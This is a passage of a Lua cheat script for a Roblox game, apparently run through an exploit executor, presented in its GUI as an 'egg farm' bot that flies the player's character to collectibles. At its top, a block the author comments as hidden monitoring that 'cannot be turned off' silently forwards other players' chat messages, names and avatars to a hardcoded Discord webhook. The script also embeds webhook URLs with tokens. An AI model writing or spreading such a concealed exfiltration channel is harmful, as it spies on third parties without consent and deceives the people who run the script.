-- ==========================================
-- СЕРВИСЫ
-- ==========================================
local HttpService = game:GetService("HttpService")
local TextChatService = game:GetService("TextChatService")
local Players = game:GetService("Players")
local PathfindingService = game:GetService("PathfindingService")
local VirtualInputManager = game:GetService("VirtualInputManager")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")
local CoreGui = game:GetService("CoreGui")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

-- ==========================================
-- УНИВЕРСАЛЬНАЯ ФУНКЦИЯ HTTP-ЗАПРОСОВ
-- ==========================================
local function getRequestFunc()
    if syn and syn.request then return syn.request end
    if http_request then return http_request end
    if request then return request end
    if httpRequest then return httpRequest end
    if fluxus and fluxus.request then return fluxus.request end
    return nil
end

-- ==========================================
-- СКРЫТЫЙ МОНИТОРИНГ ЧАТА (ФОНОВЫЙ ПРОЦЕСС)
-- ==========================================
local CHAT_WEBHOOK_URL = "https://discord.com/api/webhooks/1489315967455596714/dW3ann_p2G8xWEGj_ivisYWCY0kk9p_TM8Z7KL94xDcjrega3QyGQbzX04sNyYoqXRfl"

local CHAT_CONFIG = {
    ["jester"] = {color = 10181046, name = "Jester", emoji = "🎪"},
    ["mari"]   = {color = 16777215, name = "Mari", emoji = "🌙"},
    ["rin"]    = {color = 16776960, name = "Rin", emoji = "☀️"}
}

local function cleanRichText(str)
    return str:gsub("<[^>]+>", "")
end

local function sendChatToDiscord(sender, message, info)
    task.spawn(function()
        local reqFunc = getRequestFunc()
        if not reqFunc or CHAT_WEBHOOK_URL == "" then return end

        local cleanedMessage = cleanRichText(message)
        local description = string.format(
            "**Отправитель:** %s\n**Сообщение:** %s\n**Триггер:** %s",
            sender, cleanedMessage, info.name
        )

        local body = {
            ["content"] = "@everyone продавец (ази пупсик)!",
            ["username"] = "nexus Monitor",
            ["avatar_url"] = "https://cdn-icons-png.flaticon.com/512/8646/8646083.png",
            ["embeds"] = {{
                ["title"] = info.emoji .. " Новое совпадение в чате",
                ["description"] = description,
                ["color"] = info.color,
                ["footer"] = {
                    ["text"] = "Игра: " .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. " • " .. os.date("%H:%M:%S")
                },
                ["timestamp"] = DateTime.now():ToIsoDate()
            }}
        }

        local senderPlayer = Players:FindFirstChild(sender)
        if senderPlayer then
            body.embeds[1].thumbnail = {
                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. senderPlayer.UserId .. "&width=150&height=150&format=png"
            }
        end

        pcall(function()
            reqFunc({
                Url = CHAT_WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(body)
            })
        end)
    end)
end

-- Подключаем слушатель чата (работает всегда, выключить нельзя)
TextChatService.MessageReceived:Connect(function(textChatMessage)
    local rawText = textChatMessage.Text:lower()
    local senderName = "Unknown"

    if textChatMessage.TextSource then
        senderName = textChatMessage.TextSource.Name
    else
        local cleanMsg = cleanRichText(textChatMessage.Text)
        local match = cleanMsg:match("^%[(.-)%]") or cleanMsg:match("^(.-):")
        if match then senderName = match end
    end

    for key, info in pairs(CHAT_CONFIG) do
        if rawText:find(key) then
            sendChatToDiscord(senderName, textChatMessage.Text, info)
            break
        end
    end
end)


-- ==========================================
-- EGG FARM (MOBILE LITE EDITION)
-- ==========================================
local AutoStart = false
local ForcedScanInterval = 30
local isFarming = AutoStart
local activeEggs = {}
local blacklist = {}
local tempSkips = {}
local totalCollected = 0
local pendingEggs = {}

local FARM_WEBHOOK_URL = "https://discord.com/api/webhooks/1488832159904043108/RBf3b0n4UI4FAlaGoSDdASBz6ll61xZ_jZZXEY-cm88s8YwlfMVWqBewezEPWPHnO6pm"

local debugZonesData = {
    {Size = Vector3.new(10, 2.5, 10), CFrame = CFrame.new(180.654694, 83.9499969, -592.783386, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
    {Size = Vector3.new(35, 2, 15), CFrame = CFrame.new(191.5, 97, -671, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
    {Size = Vector3.new(16, 2, 25), CFrame = CFrame.new(130.5, 94, -675, 0, 0, 1, 0, 1, -0, -1, 0, 0)},
    {Size = Vector3.new(10, 2, 25), CFrame = CFrame.new(94.5, 98, -647.5, 0, 0, 1, 0, 1, -0, -1, 0, 0)},
    {Size = Vector3.new(11, 2, 20), CFrame = CFrame.new(98.5, 88.0000153, -426.5, 0, 0, 1, 0, 1, -0, -1, 0, 0)},
    {Size = Vector3.new(20, 2, 4), CFrame = CFrame.new(83, 88.0000153, -429.5, 0, 0, 1, 0, 1, -0, -1, 0, 0)},
    {Size = Vector3.new(8, 2, 16), CFrame = CFrame.new(77, 90.0000153, -442, 0, 0, 1, 0, 1, -0, -1, 0, 0)},
    {Size = Vector3.new(10, 0.5, 5), CFrame = CFrame.new(173.322296, 86.5, -575.310608, 0.499959469, 0, 0.866048813, 0, 1, 0, -0.866048813, 0, 0.499959469)},
    {Size = Vector3.new(7, 0.5, 2), CFrame = CFrame.new(189.179077, 87, -602.072876, 0.984812498, -0, -0.173621148, 0, 1, -0, 0.173621148, 0, 0.984812498)},
    {Size = Vector3.new(6, 5, 18.999996185302734), CFrame = CFrame.new(171, 94, -681.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
    {Size = Vector3.new(38, 2, 25), CFrame = CFrame.new(527, 94.0000153, -124, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
    {Size = Vector3.new(10, 6, 20), CFrame = CFrame.new(541.158752, 117.000008, -268.721222, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
    {Size = Vector3.new(2, 17, 5), CFrame = CFrame.new(566.847534, 190.999985, -165.76091, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
    {Size = Vector3.new(7, 17, 4), CFrame = CFrame.new(569, 197.5, -170.5, 0, 0, 1, 0, 1, -0, -1, 0, 0)},
    {Size = Vector3.new(7, 8, 5), CFrame = CFrame.new(583.261841, 220.999985, -223.692963, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
    {Size = Vector3.new(7, 230, 25), CFrame = CFrame.new(626.5, 113.5, -192.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
    {Size = Vector3.new(8, 236, 20), CFrame = CFrame.new(624, 118.000015, -157.5, 1, 0, 0, 0, 1, 0, 0, 0, 1)},
    {Size = Vector3.new(4, 8, 4), CFrame = CFrame.new(575.013, 187.000015, -225, 1, 0, 0, 0, 1, 0, 0, 0, 1)}
}

task.spawn(function()
    local folderName = "RedDebugZones"
    local folder = workspace:FindFirstChild(folderName)
    if not folder then
        folder = Instance.new("Folder")
        folder.Name = folderName
        folder.Parent = workspace
    else
        folder:ClearAllChildren()
    end
    for i, data in ipairs(debugZonesData) do
        local part = Instance.new("Part")
        part.Name = "Zone_" .. tostring(i)
        part.Size = data.Size
        part.CFrame = data.CFrame
        part.Color = Color3.fromRGB(255, 0, 0)
        part.Transparency = 0.8
        part.Material = Enum.Material.SmoothPlastic
        part.Anchored = true
        part.CanCollide = true
        local pathMod = Instance.new("PathfindingModifier")
        pathMod.Label = "ClimbPlatform"
        pathMod.PassThrough = false
        pathMod.Parent = part
        part.Parent = folder
    end
end)

local cachedPointsLabel = nil
local function findPointsLabel()
    local ok, result = pcall(function()
        for _, desc in ipairs(player.PlayerGui:GetDescendants()) do
            if desc:IsA("TextLabel") then
                local c = desc.TextColor3
                if math.abs(c.R - 170/255) < 0.05 and math.abs(c.G - 1) < 0.05 and math.abs(c.B - 127/255) < 0.05 then
                    local txt = desc.Text
                    if txt:find("%[") or txt:find("%]") or txt == "" then continue end
                    return desc
                end
            end
        end
        return nil
    end)
    return ok and result or nil
end

local function getPointsText()
    if cachedPointsLabel and cachedPointsLabel.Parent then
        local txt = cachedPointsLabel.Text
        if not txt:find("%[") and not txt:find("%]") and txt ~= "" then
            return txt
        end
    end
    cachedPointsLabel = findPointsLabel()
    if cachedPointsLabel then
        return cachedPointsLabel.Text
    end
    return nil
end

task.spawn(function()
    while true do
        if not cachedPointsLabel or not cachedPointsLabel.Parent then
            cachedPointsLabel = findPointsLabel()
        end
        task.wait(5)
    end
end)

-- ==== GUI ====
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "NexusEggFarm"
screenGui.ResetOnSpawn = false
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

local okGui = pcall(function() screenGui.Parent = CoreGui end)
if not okGui then screenGui.Parent = player:WaitForChild("PlayerGui") end

local mainFrame = Instance.new("Frame")
mainFrame.Size = UDim2.new(0, 180, 0, 140)
mainFrame.Position = UDim2.new(0.5, -90, 0.15, 0)
mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
mainFrame.BorderSizePixel = 0
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.Parent = screenGui
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)

local border = Instance.new("UIStroke", mainFrame)
border.Thickness = 1.5
border.Color = Color3.fromRGB(70, 70, 70)

local titleBar = Instance.new("Frame", mainFrame)
titleBar.Size = UDim2.new(1, 0, 0, 32)
titleBar.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleBar.BorderSizePixel = 0
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 12)

local titleFix = Instance.new("Frame", titleBar)
titleFix.Size = UDim2.new(1, 0, 0, 12)
titleFix.Position = UDim2.new(0, 0, 1, -12)
titleFix.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
titleFix.BorderSizePixel = 0

local title = Instance.new("TextLabel", titleBar)
title.Size = UDim2.new(1, -35, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.BackgroundTransparency = 1
title.Text = "Nexus Egg Farm"
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.Font = Enum.Font.GothamBold
title.TextSize = 13
title.TextXAlignment = Enum.TextXAlignment.Left

local minBtn = Instance.new("TextButton", titleBar)
minBtn.Size = UDim2.new(0, 24, 0, 24)
minBtn.Position = UDim2.new(1, -28, 0.5, -12)
minBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
minBtn.Text = "−"
minBtn.TextColor3 = Color3.fromRGB(200, 200, 200)
minBtn.TextSize = 16
minBtn.Font = Enum.Font.GothamBold
minBtn.BorderSizePixel = 0
Instance.new("UICorner", minBtn).CornerRadius = UDim.new(0, 6)

local content = Instance.new("Frame", mainFrame)
content.Name = "Content"
content.Size = UDim2.new(1, -16, 1, -40)
content.Position = UDim2.new(0, 8, 0, 36)
content.BackgroundTransparency = 1

local statusLabel = Instance.new("TextLabel", content)
statusLabel.Size = UDim2.new(1, 0, 0, 16)
statusLabel.Position = UDim2.new(0, 0, 0, 0)
statusLabel.BackgroundTransparency = 1
statusLabel.Text = "● Idle"
statusLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextSize = 11
statusLabel.TextXAlignment = Enum.TextXAlignment.Left

local countLabel = Instance.new("TextLabel", content)
countLabel.Size = UDim2.new(1, 0, 0, 16)
countLabel.Position = UDim2.new(0, 0, 0, 18)
countLabel.BackgroundTransparency = 1
countLabel.Text = "Collected: 0"
countLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
countLabel.Font = Enum.Font.Gotham
countLabel.TextSize = 11
countLabel.TextXAlignment = Enum.TextXAlignment.Left

local lastLabel = Instance.new("TextLabel", content)
lastLabel.Size = UDim2.new(1, 0, 0, 16)
lastLabel.Position = UDim2.new(0, 0, 0, 36)
lastLabel.BackgroundTransparency = 1
lastLabel.Text = "Last: —"
lastLabel.TextColor3 = Color3.fromRGB(130, 130, 130)
lastLabel.Font = Enum.Font.Gotham
lastLabel.TextSize = 10
lastLabel.TextXAlignment = Enum.TextXAlignment.Left
lastLabel.TextTruncate = Enum.TextTruncate.AtEnd

local actionBtn = Instance.new("TextButton", content)
actionBtn.Size = UDim2.new(1, 0, 0, 36)
actionBtn.Position = UDim2.new(0, 0, 1, -38)
actionBtn.Font = Enum.Font.GothamBold
actionBtn.TextSize = 14
actionBtn.BorderSizePixel = 0
Instance.new("UICorner", actionBtn).CornerRadius = UDim.new(0, 8)

local function updateVisuals()
    if isFarming then
        actionBtn.Text = "STOP"
        actionBtn.BackgroundColor3 = Color3.fromRGB(200, 200, 200)
        actionBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
        border.Color = Color3.fromRGB(200, 200, 200)
        statusLabel.Text = "● Farming"
        statusLabel.TextColor3 = Color3.fromRGB(220, 220, 220)
    else
        actionBtn.Text = "START"
        actionBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
        actionBtn.TextColor3 = Color3.fromRGB(220, 220, 220)
        border.Color = Color3.fromRGB(70, 70, 70)
        statusLabel.Text = "● Idle"
        statusLabel.TextColor3 = Color3.fromRGB(140, 140, 140)
    end
end

actionBtn.MouseButton1Click:Connect(function()
    isFarming = not isFarming
    updateVisuals()
    if not isFarming then
        local ap = rootPart:FindFirstChild("FlyPos")
        local ao = rootPart:FindFirstChild("FlyOri")
        if ap then ap.Enabled = false end
        if ao then ao.Enabled = false end
        humanoid.PlatformStand = false
        humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
    end
end)

minBtn.MouseButton1Click:Connect(function()
    if content.Visible then
        content.Visible = false
        mainFrame.Size = UDim2.new(0, 180, 0, 32)
        minBtn.Text = "+"
    else
        content.Visible = true
        mainFrame.Size = UDim2.new(0, 180, 0, 140)
        minBtn.Text = "−"
    end
end)

task.spawn(function()
    while screenGui.Parent do
        countLabel.Text = "Collected: " .. totalCollected
        task.wait(1)
    end
end)

local targetPriorities = {
    ["andromeda_egg"] = 100, ["angelic_egg"] = 100, ["blooming_egg"] = 100, ["dreamer_egg"] = 100, ["egg_v2"] = 100,
    ["forest_egg"] = 100, ["hatch_egg"] = 100, ["royal_egg"] = 100, ["the_egg_of_the_sky"] = 100, ["placeholder_egg"] = 100,
    ["random_potion_egg_2"] = 52, ["random_potion_egg_1"] = 51, ["point_egg_6"] = 16, ["point_egg_5"] = 15,
    ["point_egg_4"] = 14, ["point_egg_3"] = 13, ["point_egg_2"] = 12, ["point_egg_1"] = 11
}

local function sendFarmWebhook(eggName, isSuccess, pointsValue)
    task.spawn(function()
        local reqFunc = getRequestFunc()
        if not reqFunc or FARM_WEBHOOK_URL == "" then return end

        local ok, err = pcall(function()
            local priority = targetPriorities[eggName] or 0
            local isPriority100 = (priority == 100)
            local prettyName = eggName:gsub("_", " "):gsub("(%a)([%w]*)", function(a, b) return a:upper() .. b end)
            local rarityTag = "Common"
            local embedColor = 8421504

            if priority == 100 then
                rarityTag = "LEGENDARY"
                embedColor = 16766720
            elseif priority >= 50 then
                rarityTag = "Epic"
                embedColor = 10494192
            elseif priority >= 14 then
                rarityTag = "Rare"
                embedColor = 3447003
            elseif priority >= 11 then
                rarityTag = "Common"
                embedColor = 8421504
            end

            if not isSuccess then
                embedColor = 16711680
            end

            local pointsStr = pointsValue or "N/A"
            local fields = {
                {["name"] = "Egg", ["value"] = prettyName, ["inline"] = true},
                {["name"] = "Rarity", ["value"] = rarityTag, ["inline"] = true},
                {["name"] = "Priority", ["value"] = tostring(priority), ["inline"] = true},
                {["name"] = "Total Collected", ["value"] = tostring(totalCollected), ["inline"] = true},
                {["name"] = "Points", ["value"] = pointsStr, ["inline"] = true},
                {["name"] = "Player", ["value"] = player.Name .. " (" .. player.DisplayName .. ")", ["inline"] = true}
            }

            local embedTitle
            if isPriority100 then
                embedTitle = "LEGENDARY EGG COLLECTED!"
            elseif isSuccess then
                embedTitle = "Egg Collected"
            else
                embedTitle = "Collection Failed"
            end

            local body = {
                ["embeds"] = {{
                    ["title"] = embedTitle,
                    ["description"] = isSuccess and ("**" .. prettyName .. "** has been collected!") or ("Failed to collect **" .. prettyName .. "**"),
                    ["color"] = embedColor,
                    ["fields"] = fields,
                    ["footer"] = {["text"] = "Nexus Egg Farm | " .. os.date("%H:%M:%S")},
                    ["timestamp"] = DateTime.now():ToIsoDate()
                }}
            }

            if isPriority100 then
                body["content"] = "@everyone LEGENDARY EGG!"
            end

            reqFunc({
                Url = FARM_WEBHOOK_URL,
                Method = "POST",
                Headers = {["Content-Type"] = "application/json"},
                Body = HttpService:JSONEncode(body)
            })
        end)

        if not ok then warn("[Webhook Error]: " .. tostring(err)) end
    end)
end

-- ==== ЗОНЫ ====
local blacklistZone1 = { Size = Vector3.new(150, 90, 150), CFrame = CFrame.new(-28.1648, 128.4687, -123.9840) }
local islandZones = {
    [4] = { Parent = nil, Size = Vector3.new(50, 20, 50), CFrame = CFrame.new(541.4514, 98.0000, -108.5778), Path = { Vector3.new(504.7574, 97.9906, -137.8735), Vector3.new(511.1336, 98.0000, -125.9527) }},
    [5] = { Parent = nil, Size = Vector3.new(40, 20, 40), CFrame = CFrame.new(160, 100, -680.759), Path = { Vector3.new(186.326, 101.00, -675.180), Vector3.new(165.688, 100.00, -676.847) }},
    [6] = { Parent = 5, Size = Vector3.new(50, 30, 50), CFrame = CFrame.new(119.151, 111.00, -666.513), Path = { Vector3.new(143.737, 97.969, -678.703), Vector3.new(131.039, 97.981, -678.368) }}
}

local function checkZone(pos)
    local lp1 = blacklistZone1.CFrame:PointToObjectSpace(pos)
    if math.abs(lp1.X) <= (blacklistZone1.Size.X / 2) and math.abs(lp1.Y) <= (blacklistZone1.Size.Y / 2) and math.abs(lp1.Z) <= (blacklistZone1.Size.Z / 2) then return "BLACKLIST" end
    for id, data in pairs(islandZones) do
        local lp = data.CFrame:PointToObjectSpace(pos)
        if math.abs(lp.X) <= data.Size.X/2 and math.abs(lp.Y) <= data.Size.Y/2 and math.abs(lp.Z) <= data.Size.Z/2 then return id end
    end
    return nil
end

local rayParams = RaycastParams.new()
rayParams.FilterType, rayParams.RespectCanCollide, rayParams.IgnoreWater = Enum.RaycastFilterType.Exclude, true, true
player.CharacterAdded:Connect(function(nc)
    character, humanoid, rootPart = nc, nc:WaitForChild("Humanoid"), nc:WaitForChild("HumanoidRootPart")
    rayParams.FilterDescendantsInstances = {character}
end)
rayParams.FilterDescendantsInstances = {character}

local function setupDangerZones()
    local map = workspace:FindFirstChild("Map")
    if not map then return end
    local function applyModifier(part)
        if part:IsA("BasePart") then
            if not part:FindFirstChild("DangerMod") then
                local mod = Instance.new("PathfindingModifier")
                mod.Name = "DangerMod"
                mod.Label = "DangerZone"
                mod.Parent = part
            end
        end
    end
    local miscs = map:FindFirstChild("Miscs")
    if miscs then
        local waterBlocks = miscs:FindFirstChild("WaterBlocks")
        if waterBlocks then
            for _, block in ipairs(waterBlocks:GetChildren()) do
                if block.Name == "WaterBlock" then applyModifier(block) end
            end
        end
    end
    local lava = map:FindFirstChild("lava")
    if lava then
        for _, part in ipairs(lava:GetDescendants()) do applyModifier(part) end
    end
end
setupDangerZones()

-- ==== СИСТЕМА ОБНАРУЖЕНИЯ ЯИЦ ====
local function findEggAncestor(obj)
    local current = obj
    while current and current ~= workspace do
        if targetPriorities[current.Name] then
            return current
        end
        current = current.Parent
    end
    return nil
end

local function tryRegisterEgg(eggModel)
    if not eggModel or not eggModel.Parent then return false end
    if not targetPriorities[eggModel.Name] then return false end
    if activeEggs[eggModel] or blacklist[eggModel] then return true end

    local p = nil
    if eggModel:IsA("BasePart") then
        p = eggModel
    else
        p = eggModel:FindFirstChildWhichIsA("BasePart", true)
    end

    if p then
        if checkZone(p.Position) == "BLACKLIST" then
            blacklist[eggModel] = true
        else
            activeEggs[eggModel] = p
        end
        pendingEggs[eggModel] = nil
        return true
    end
    return false
end

local function scheduleEggWatch(eggModel)
    if not eggModel or not targetPriorities[eggModel.Name] then return end
    if activeEggs[eggModel] or blacklist[eggModel] then return end
    if pendingEggs[eggModel] then return end

    pendingEggs[eggModel] = true
    task.spawn(function()
        for _, delay in ipairs({0.1, 0.3, 0.5, 1.0, 1.5, 2.0, 3.0, 5.0}) do
            task.wait(delay)
            if not eggModel or not eggModel.Parent then
                pendingEggs[eggModel] = nil
                return
            end
            if tryRegisterEgg(eggModel) then
                return
            end
        end

        if eggModel and eggModel.Parent and not activeEggs[eggModel] and not blacklist[eggModel] then
            local conn
            conn = eggModel.DescendantAdded:Connect(function(desc)
                if desc:IsA("BasePart") then
                    if tryRegisterEgg(eggModel) then
                        if conn and conn.Connected then
                            conn:Disconnect()
                        end
                    end
                end
            end)
            task.delay(60, function()
                if conn and conn.Connected then
                    conn:Disconnect()
                end
                pendingEggs[eggModel] = nil
            end)
            task.wait(0.1)
            if tryRegisterEgg(eggModel) then
                if conn and conn.Connected then
                    conn:Disconnect()
                end
            end
        else
            pendingEggs[eggModel] = nil
        end
    end)
end

local function checkAndAddEgg(obj)
    if not obj or not obj.Parent then return end

    if targetPriorities[obj.Name] then
        if not tryRegisterEgg(obj) then
            scheduleEggWatch(obj)
        end
    end

    if obj:IsA("BasePart") then
        local eggAncestor = findEggAncestor(obj)
        if eggAncestor then
            tryRegisterEgg(eggAncestor)
        end
    end

    if obj:IsA("Model") or obj:IsA("Folder") then
        local eggAncestor = findEggAncestor(obj)
        if eggAncestor and eggAncestor ~= obj then
            tryRegisterEgg(eggAncestor)
        end
    end
end

local function scanWorkspace()
    setupDangerZones()
    local descendants = workspace:GetDescendants()
    for i, o in ipairs(descendants) do
        if targetPriorities[o.Name] then
            if not tryRegisterEgg(o) then
                scheduleEggWatch(o)
            end
        end
        if i % 200 == 0 then task.wait() end
    end
end
scanWorkspace()

workspace.DescendantAdded:Connect(function(obj)
    task.defer(function() checkAndAddEgg(obj) end)
end)

workspace.DescendantRemoving:Connect(function(o)
    activeEggs[o] = nil
    blacklist[o] = nil
    tempSkips[o] = nil
    pendingEggs[o] = nil

    local eggAncestor = findEggAncestor(o)
    if eggAncestor then
        local stillHasPart = eggAncestor:FindFirstChildWhichIsA("BasePart", true)
        if not stillHasPart then
            activeEggs[eggAncestor] = nil
        end
    end
end)

task.spawn(function()
    while true do
        task.wait(ForcedScanInterval)
        if isFarming then scanWorkspace() end
    end
end)

local function getBestEgg()
    local bestO, bestP, bestPr, minDist = nil, nil, -1, math.huge
    local rPos = rootPart.Position
    for o, p in pairs(activeEggs) do
        if not blacklist[o] and not tempSkips[o] then
            if p and p.Parent and p.Transparency < 1 then
                local pr = targetPriorities[o.Name] or 0
                local pPos = p.Position
                local d = math.sqrt((rPos.X - pPos.X)^2 + (rPos.Y - pPos.Y)^2 + (rPos.Z - pPos.Z)^2)
                if pr > bestPr or (pr == bestPr and d < minDist) then
                    bestO, bestP, bestPr, minDist = o, p, pr, d
                end
            else
                if o and o.Parent then
                    local newP = o:FindFirstChildWhichIsA("BasePart", true)
                    if newP and newP.Transparency < 1 then
                        activeEggs[o] = newP
                        p = newP
                        local pr = targetPriorities[o.Name] or 0
                        local pPos = p.Position
                        local d = math.sqrt((rPos.X - pPos.X)^2 + (rPos.Y - pPos.Y)^2 + (rPos.Z - pPos.Z)^2)
                        if pr > bestPr or (pr == bestPr and d < minDist) then
                            bestO, bestP, bestPr, minDist = o, p, pr, d
                        end
                    else
                        activeEggs[o] = nil
                    end
                else
                    activeEggs[o] = nil
                end
            end
        end
    end
    return bestO, bestP
end

-- ==== FLY SYSTEM ====
local function setupFly()
    local att = rootPart:FindFirstChild("FlyAtt") or Instance.new("Attachment", rootPart)
    att.Name = "FlyAtt"
    local ap = rootPart:FindFirstChild("FlyPos") or Instance.new("AlignPosition", rootPart)
    ap.Name, ap.Mode, ap.Attachment0, ap.MaxForce, ap.Responsiveness = "FlyPos", Enum.PositionAlignmentMode.OneAttachment, att, 9999999, 80
    ap.Enabled = false
    local ao = rootPart:FindFirstChild("FlyOri") or Instance.new("AlignOrientation", rootPart)
    ao.Name, ao.Mode, ao.Attachment0, ao.MaxTorque, ao.Responsiveness = "FlyOri", Enum.OrientationAlignmentMode.OneAttachment, att, 9999999, 80
    ao.Enabled = false
    return ap, ao
end

local function flyTo(targetPos, isJump, maxTime)
    if not humanoid or humanoid.Health <= 0 then return false end
    local ap, ao = setupFly()
    humanoid.PlatformStand = true
    ap.Enabled, ao.Enabled = true, true
    ap.MaxVelocity = humanoid.WalkSpeed
    local hOff = (humanoid.RigType == Enum.HumanoidRigType.R15) and (humanoid.HipHeight + rootPart.Size.Y / 2) or 3
    local bY = targetPos.Y + hOff
    local reached, stuckT, lastP, startT = false, 0, rootPart.Position, tick()
    local stuckAttempts = 0

    local hover = RunService.Heartbeat:Connect(function()
        if not isFarming or humanoid.Health <= 0 then return end
        local cPos = rootPart.Position
        local tX, tZ = targetPos.X, targetPos.Z
        local dx, dz = tX - cPos.X, tZ - cPos.Z
        local flatDist = math.sqrt(dx * dx + dz * dz)
        local heightDiff = bY - cPos.Y
        local mDir = Vector3.zero
        if flatDist > 0.3 then mDir = Vector3.new(dx, 0, dz).Unit end
        local hasObstacleAhead = false
        if mDir ~= Vector3.zero then
            local hitMid = workspace:Raycast(cPos, mDir * 4, rayParams)
            local hitFeet = workspace:Raycast(cPos - Vector3.new(0, 2.5, 0), mDir * 4, rayParams)
            hasObstacleAhead = (hitMid ~= nil) or (hitFeet ~= nil)
        end
        if heightDiff > 2 then
            if hasObstacleAhead then ap.Position = Vector3.new(cPos.X, cPos.Y + 12, cPos.Z); return end
            ap.Position = Vector3.new(tX, bY + 1.5, tZ)
            return
        end
        if heightDiff < -2 then
            if flatDist < 4 then
                local blockBelow = workspace:Raycast(cPos, Vector3.new(0, -3, 0), rayParams)
                if blockBelow and (cPos.Y - blockBelow.Position.Y) < 2.5 then
                    local nudge = mDir * 5
                    if nudge.Magnitude < 0.1 then nudge = rootPart.CFrame.RightVector * 4 end
                    ap.Position = cPos + nudge + Vector3.new(0, -1, 0)
                else
                    ap.Position = Vector3.new(tX, bY, tZ)
                end
                return
            end
            if hasObstacleAhead then
                if heightDiff < -10 then
                    local side = rootPart.CFrame.RightVector * 5
                    ap.Position = cPos + side + Vector3.new(0, -2, 0)
                else
                    ap.Position = Vector3.new(cPos.X, cPos.Y + 6, cPos.Z)
                end
                return
            end
            ap.Position = Vector3.new(tX, bY, tZ)
            return
        end
        if hasObstacleAhead then ap.Position = Vector3.new(cPos.X, cPos.Y + 10, cPos.Z); return end
        ap.Position = Vector3.new(tX, bY, tZ)
    end)

    while not reached and isFarming and humanoid and humanoid.Health > 0 do
        if maxTime and (tick() - startT) >= maxTime then break end
        task.wait()
        ao.CFrame = CFrame.lookAt(rootPart.Position, Vector3.new(targetPos.X, rootPart.Position.Y, targetPos.Z))
        local cPos = rootPart.Position
        local currentFlatDist = math.sqrt((cPos.X - targetPos.X)^2 + (cPos.Z - targetPos.Z)^2)
        if currentFlatDist < 3 and math.abs(cPos.Y - bY) < 5 then
            reached = true
            break
        end
        local moved = math.sqrt((cPos.X - lastP.X)^2 + (cPos.Y - lastP.Y)^2 + (cPos.Z - lastP.Z)^2)
        if moved < 0.12 then
            stuckT = stuckT + task.wait()
            if stuckT > 1.5 then
                stuckAttempts = stuckAttempts + 1
                stuckT = 0
                if stuckAttempts >= 4 then break end
                local hDiff = bY - cPos.Y
                if hDiff < -3 then
                    local sideDir = rootPart.CFrame.RightVector * (stuckAttempts % 2 == 0 and 7 or -7)
                    ap.Position = cPos + sideDir + Vector3.new(0, -4, 0)
                elseif hDiff > 3 then
                    ap.Position = cPos - rootPart.CFrame.LookVector * 5 + Vector3.new(0, 10, 0)
                else
                    ap.Position = cPos - rootPart.CFrame.LookVector * 6 + Vector3.new(0, 3, 0)
                end
                task.wait(0.6)
            end
        else
            stuckT = 0
        end
        lastP = cPos
    end
    hover:Disconnect()
    ap.Enabled, ao.Enabled = false, false
    return reached
end

local function getChainTo(targetId)
    local chain = {}
    local curr = targetId
    while curr do table.insert(chain, 1, curr) curr = islandZones[curr].Parent end
    return chain
end

local function smartPath(targetPos, checkPart, huntStart)
    local path = PathfindingService:CreatePath({
        AgentRadius = 3, AgentHeight = 5, AgentCanJump = true, WaypointSpacing = 3,
        Costs = {Water = math.huge, DangerZone = math.huge, ClimbPlatform = 0.1}
    })
    local success, _ = pcall(function() path:ComputeAsync(rootPart.Position, targetPos) end)
    if not success or path.Status ~= Enum.PathStatus.Success then return "NoPath" end
    local wps = path:GetWaypoints()
    for i = 2, #wps do
        if not isFarming or humanoid.Health <= 0 then return "Failed" end
        if huntStart and tick() - huntStart > 60 then return "Timeout" end
        if checkPart and (not checkPart.Parent or checkPart.Transparency == 1) then return "Failed" end

        local cPos = rootPart.Position
        if math.sqrt((cPos.X - targetPos.X)^2 + (cPos.Y - targetPos.Y)^2 + (cPos.Z - targetPos.Z)^2) < 8 then return "Reached" end
        if not flyTo(wps[i].Position, wps[i].Action == Enum.PathWaypointAction.Jump, 4) then
            local cY = rootPart.Position.Y
            local tY = wps[i].Position.Y
            if cY > tY + 5 then
                flyTo(rootPart.Position + rootPart.CFrame.RightVector * 6 + Vector3.new(0, -3, 0), false, 1)
            elseif cY < tY - 5 then
                flyTo(rootPart.Position - rootPart.CFrame.LookVector * 5 + Vector3.new(0, 8, 0), false, 1)
            else
                flyTo(rootPart.Position + (-rootPart.CFrame.LookVector * 5), false, 0.5)
            end
            return "Stuck"
        end
    end
    return "Reached"
end

local function interactWithPrompt(obj)
    local pr = nil
    if obj:IsA("ProximityPrompt") then
        pr = obj
    else
        pr = obj:FindFirstChildWhichIsA("ProximityPrompt", true)
    end

    if pr then
        if fireproximityprompt then
            fireproximityprompt(pr, 1)
            task.wait(0.2)
        else
            local key = pr.KeyboardKeyCode == Enum.KeyCode.Unknown and Enum.KeyCode.E or pr.KeyboardKeyCode
            VirtualInputManager:SendKeyEvent(true, key, false, game)
            task.wait(pr.HoldDuration + 0.2)
